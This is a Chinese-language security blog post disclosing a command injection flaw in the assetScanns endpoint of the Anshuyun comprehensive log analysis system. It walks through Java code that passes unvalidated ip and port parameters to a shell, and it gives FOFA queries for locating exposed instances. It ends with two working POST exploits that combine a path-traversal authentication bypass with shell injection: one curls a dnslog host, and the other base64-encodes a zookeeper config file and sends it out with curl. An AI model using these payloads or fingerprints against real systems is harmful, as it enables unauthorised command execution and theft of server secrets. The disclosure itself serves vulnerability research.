---
title: "安数云综合日志分析系统 assetScanns 命令执行漏洞"
source: https://mrxn.net/jswz/datacloudsec-assetTopo-assetScanns-rce.html
asset_dir: assets/安数云综合日志分析系统-assetscanns-命令执行漏洞
---

# 安数云综合日志分析系统 assetScanns 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/27 08:31
- 812浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

技术文章订阅

企业安全咨询

数据库

---

# 漏洞简介

安数云日志审计系统是安数云公司自主研发的专业日志安全审计产品。该系统可以实时监视网络中的各种操作行为和攻击信息，通过事件监控模块监控网络设备、主机系统等的日志信息，及时发现正在发生和已经发生的安全事件，并通过响应模块采取措施，确保网络和业务系统的安全。安数云综合日志分析系统的 /assetTopo/assetScanns 接口存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该漏洞在服务器端执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

# fofa语法

> (fid="ABUp4kzJ+itzKQ+J4McbEw==") && (is\_honeypot=false && is\_fraud=false)
>
> (icon\_hash="829311222" || icon\_hash="-2008445303") && (is\_honeypot=false && is\_fraud=false)

# 漏洞分析

漏洞触发位置在`com.datacloudsec.web.asset.controller.AssetTopoController`中,看下有关**assetScanns**的处理逻辑

```
@RequestMapping({"/assetScanns"})
  @FuncAuthIntercept
  public Object assetScanns(@RequestParam("ip") String ip, @RequestParam("port") String port) {
    this.lastScanConfig = new ScanConfigBean(ip, port);
    FileKit.ensureDirExist(this.webConfig.getOutputPath());
    String outputPath = FileKit.absolutePath(this.webConfig.getOutputPath() + File.separatorChar + "nmap_output.xml");
    boolean result = this.assetScannService.assetScann(outputPath, ip, port);
    if (!result)
      return WebKit.okMap("error"); 
    return WebKit.okMap();
  }
```

深入探索

安全研究报告

代码安全审计

在线安全工具

参数**ip**和**port**被带入**assetScann**方法中

```
public boolean assetScann(String fileSrc, String ip, String port) {
    String nmapDir = "nmap ";
    StringBuffer command = new StringBuffer();
    if (null == port || port.trim().equals("")) {
      command.append("-sV ");
    } else {
      command.append("-sV -p ");
      command.append(port);
      command.append(" ");
    } 
    command.append(ip);
    command.append(" --open --min-hostgroup 1024 --min-parallelism 10 --host-timeout 30 -O -T4 -oX ");
    boolean scannBool = true;
    try {
      scannBool = getScannXmlFile(nmapDir, command.toString(), fileSrc);
    } catch (IOException e) {
      logger.info("Scann Error");
    } 
    return scannBool;
  }
```

深入探索

安全运维咨询

授权

SQL

如果参数**port不为空或者null**这在拼接在`command`中 `-sV -p port`，然后再将`ip`拼接在后面，最后进入**getScannXmlFile**方法中

```
private boolean getScannXmlFile(String nmapDir, String command, String fileSrc) throws IOException {
    logger.info("scann host =============:" + nmapDir + command + fileSrc);
    (new Thread(() -> CmdKit.execute(nmapDir + command + fileSrc))).start();
    return true;
  }
```

调用**CmdKit.execute**执行上面拼接的命令

安全工具开发

```
public static boolean execute(String cmd) {
    String result = executeForStr(cmd);
    return !"EXECUTE_ERROR".equals(result);
  }
```

跟进**executeForStr**方法，其中对针对不同的系统使用 `cmd /c` 或者 `/bin/sh` 调用**Runtime.getRuntime().exec**[执行最终的命令](https://mrxn.net/tag/rce)

```
 public static String executeForStr(String cmd) {
    if (StringUtils.isBlank(cmd))
      return "EXECUTE_ERROR"; 
    BufferedReader bufferedReader = null;
    try {
      StringBuilder output = new StringBuilder(100);
      String[] cmdString = new String[3];
      if (isWindowsOS()) {
        cmdString[0] = "cmd.exe";
        cmdString[1] = "/C";
      } else {
        cmdString[0] = "/bin/sh";
        cmdString[1] = "-c";
      } 
      cmdString[2] = cmd;
      Process process = Runtime.getRuntime().exec(cmdString);
      bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      String line;
      while ((line = bufferedReader.readLine()) != null)
        output.append(line); 
      logger.info("cmd is [{}]", cmd);
      logger.info("cmd result is [{}]", output.toString());
      int exitValue = process.waitFor();
      if (exitValue != 0)
        logger.error("executeForStr failure, exitValue is {}!", Integer.valueOf(exitValue)); 
      return output.toString();
    } catch (Exception e) {
      logger.error(e.getMessage());
      return "EXECUTE_ERROR";
    } finally {
      IOUtils.closeQuietly(bufferedReader);
    } 
  }
```

至此，可以看到整个流程都没有对传入的参数**ip**和**port**进行校验或者过滤，因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

该系统还存在几处需要adm权限（登录后）的[命令注入](https://mrxn.net/tag/rce)点，由于需要权限，暂不赘述。

计算机服务器

# 漏洞复现

[![安数云综合日志分析系统 assetScanns 命令执行漏洞](images/img-001-1a4329c41cea.webp)](https://image.mrxn.net/bae127872ddf4256b215b72dc9c522fd.webp)

```
POST /js/..;/assetTopo/assetScanns HTTP/1.1
Host: datacloudsec.mrxn.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt;&port=80
```

[命令执行](https://mrxn.net/tag/rce)结果外带

黑客与破解

```
POST /js/..;/assetTopo/assetScanns HTTP/1.1
Host: datacloudsec.mrxn.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt -d `cat /opt/software/zookeeper/conf/zoo.cfg |base64 -w 0`;&port=80
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
